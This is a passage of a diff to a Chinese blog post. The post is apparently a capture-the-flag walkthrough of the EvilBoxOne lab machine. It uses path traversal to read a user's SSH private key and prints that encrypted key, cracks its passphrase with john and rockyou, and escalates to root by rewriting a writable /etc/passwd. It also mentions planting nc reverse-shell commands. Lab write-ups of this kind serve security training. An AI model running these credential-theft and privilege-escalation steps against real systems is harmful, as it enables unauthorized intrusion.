------END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.0.2.9/secret/evil.php?<span class="built_in">command</span>=../../../../../home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+<p>查看页面源码的格式比较好看（注意格式不要改变）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E</span><br><span class="line">uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6</span><br><span class="line">hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe</span><br><span class="line">o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb</span><br><span class="line">+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot</span><br><span class="line">b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k</span><br><span class="line">HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg</span><br><span class="line">9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY</span><br><span class="line">zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu</span><br><span class="line">rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1</span><br><span class="line">tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs</span><br><span class="line">94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm</span><br><span class="line">VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7</span><br><span class="line">Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P</span><br><span class="line">hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr</span><br><span class="line">Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR</span><br><span class="line">IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R</span><br><span class="line">MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS</span><br><span class="line">62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69</span><br><span class="line">Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8</span><br><span class="line">p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C</span><br><span class="line">pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X</span><br><span class="line">KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa</span><br><span class="line">i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp</span><br><span class="line">4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/</span><br><span class="line">8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
 <p><strong>第三步，利用私钥登录</strong></p>
-<p>将私钥写入到一个文件，然后执行下面命令 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> mowree@10.0.2.9 -i id_rsa <span class="token comment"># 文件名可以任意</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>将私钥写入到一个文件，然后执行下面命令 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -i id_rsa <span class="comment"># 文件名可以任意</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231421.png" /></p>
 <hr />
 <p><strong>提示</strong>：</p>
 <p>不论将私钥所在的文件名是什么，一定要将权限设置为600，否则会报错，提示权限不够。（一般公、私钥的文件配置都是600）就像下图一样：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406231324.png" /></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">600</span> id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
 <hr />
 <p>使用私钥登录发现还需要输入一个<code>passphrase</code>。</p>
 <blockquote>
 <p>公私钥对生成的时候，有时候会给私钥加一个密码，要想利用公钥登录方式的话，就必须输入加密私钥的密码。 可以使用密码爆破。有hashcat， john等工具</p>
 </blockquote>
-<p>先将 id_rsa 进行格式转换为john能够识别的（目录在<code>/usr/share/john</code>）： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ssh2john.py /home/hdfzzf/id_rsa <span class="token operator">></span> /home/hdfzzf/hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>然后进行破解（最好找一个大一点的字典，建议<code>/usr/share/wordlists/rockyou.txt.gz</code>）： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token builtin class-name">hash</span> --wordlist<span class="token operator">=</span>rockyou.txt <span class="token comment"># 将字典和hash放到同一目录</span>
-
-爆破结果：unicorn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>先将 id_rsa 进行格式转换为john能够识别的（目录在<code>/usr/share/john</code>）： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py /home/hdfzzf/id_rsa &gt; /home/hdfzzf/<span class="built_in">hash</span></span><br></pre></td></tr></table></figure></p>
+<p>然后进行破解（最好找一个大一点的字典，建议<code>/usr/share/wordlists/rockyou.txt.gz</code>）： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt <span class="comment"># 将字典和hash放到同一目录</span></span><br><span class="line"></span><br><span class="line">爆破结果：unicorn</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232742.png" /></p>
-<p>再次利用SSH公钥登录 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. <span class="token function">ssh</span> mowree@10.0.2.9 -i id_rsa
-<span class="token number">2</span>. 输入密码：unicorn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>再次利用SSH公钥登录 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. ssh mowree@10.0.2.9 -i id_rsa</span><br><span class="line">2. 输入密码：unicorn</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406232911.png" /></p>
 <p>成功get shell！</p>
 <h2 id="权限提升">权限提升</h2>
-<p>Linux本题提权可以使用：内核漏洞、SUID、SUDO配置、crontab任务。其中查找SUID/SGID文件可以用下面的命令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token comment"># 4000代表suid权限，2000代表SGID；后面的表示不显示报错信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>Linux本题提权可以使用：内核漏洞、SUID、SUDO配置、crontab任务。其中查找SUID/SGID文件可以用下面的命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null <span class="comment"># 4000代表suid权限，2000代表SGID；后面的表示不显示报错信息</span></span><br></pre></td></tr></table></figure></p>
 <p>要查找第三方编写的程序是否具有SUID/SGID。经查找发现并没有可用的。</p>
 <p>这里介绍一个新的提权思路：<strong>查找靶机上当前用户拥有写权限且拥有者为root的文件，然后改写文件内容实现提权（比如写入nc反弹shell的命令）</strong>。</p>
-<p>利用下述命令寻找拥有写权限的文件。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -writable <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> -v proc<span class="token operator">|</span><span class="token function">grep</span> -v run<span class="token operator">|</span><span class="token function">grep</span> -v sys
-
-查找拥有写权限的文件。过滤proc目录，该目录的文件是系统运行过程中动态生成的。一般run，sys目录也不用看
-
-<span class="token number">2</span>: 表示标准错误
-<span class="token string">'>'</span><span class="token builtin class-name">:</span> 重定向
-/dev/null: 是空设备，它接受您想要的任何输入并将其丢弃。它可以用来抑制任何输出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>利用下述命令寻找拥有写权限的文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc|grep -v run|grep -v sys</span><br><span class="line"></span><br><span class="line">查找拥有写权限的文件。过滤proc目录，该目录的文件是系统运行过程中动态生成的。一般run，sys目录也不用看</span><br><span class="line"></span><br><span class="line">2: 表示标准错误</span><br><span class="line"><span class="string">&#x27;&gt;&#x27;</span>: 重定向</span><br><span class="line">/dev/null: 是空设备，它接受您想要的任何输入并将其丢弃。它可以用来抑制任何输出。</span><br></pre></td></tr></table></figure></p>
 <p>此时注意到这么一个文件：<code>/etc/passwd</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407085603.png" /></p>
 <p>这个文件存储的靶机上所有用户的信息，一般用户只有读权限，而没有写权限。而这台靶机上却拥有写权限，这是一个极大的漏洞！</p>
@@ -384,18 +311,14 @@ i99+vYdwe8+8nJq4&#x2F;WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS&#x2F;4Q6DVVxTHdp
 <p>小知识：<code>/etc/passwd</code>里面的第二个字段是密码字段，一般都只有一个x，表示密码已加密保存在<code>/etc/shadow</code>（这文件普通用户连读权限都没有）。但是，优先级是<code>/etc/passwd</code>优先，也就是如果<code>/etc/passwd</code>里面密码字段保存了密码，那么<code>/etc/shadow</code>中的密码就会失效！</p>
 </blockquote>
 <p>接下来的思路很明确了，修改<code>/etc/passwd</code>中root的密码字段，然后直接用<code>su -</code>命令切换。（也可以直接添加一条记录<code>echo "root2:加密密码:0:0:root:/root:/bin/bash"</code>，因为用户名不是最重要的，重要的是uid，uid为0即使用户名不是root，也拥 有root权限。）</p>
-<p>生成密码的加密密文： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl <span class="token function">passwd</span> -1 root <span class="token comment"># -1 某种加密算法</span>
-
-明文：root
-密文：<span class="token variable">$1</span><span class="token variable">$yKHIKZSK</span><span class="token variable">$R26qtrasBuYAfoQJvngpU0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>生成密码的加密密文： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 root <span class="comment"># -1 某种加密算法</span></span><br><span class="line"></span><br><span class="line">明文：root</span><br><span class="line">密文：$1$yKHIKZSK<span class="variable">$R26qtrasBuYAfoQJvngpU0</span></span><br></pre></td></tr></table></figure></p>
 <p>（这里操作需要注意：需要在正常模式下删除和粘贴密码，插入模式下上下左右删都会被解析为字符）</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090904.png" /></p>
-<p>然后 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> - 或者 <span class="token function">su</span> root <span class="token comment"># 登录root</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - 或者 su root <span class="comment"># 登录root</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407090950.png" /></p>
 <p>成功登录。</p>
 <p>第一个flag在<code>/home/mowree/user.txt</code>，第二个flag在<code>/root/root.txt</code>。</p>
-<pre class="line-numbers language-none"><code class="language-none">user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
-root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user.txt: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br><span class="line">root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>
 <p>到此，本台靶机的渗透结束。</p>
 <h2 id="验证操作">验证操作</h2>
 <p>发现即使改了root的密码，也无法直接用ssh直接登录root，原因是权限不够。</p>
@@ -462,7 +385,6 @@ root.txt: 36QtXfdJWvdC0VavlPIApUbDlqTsBM<span aria-hidden="true" class="line-num
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
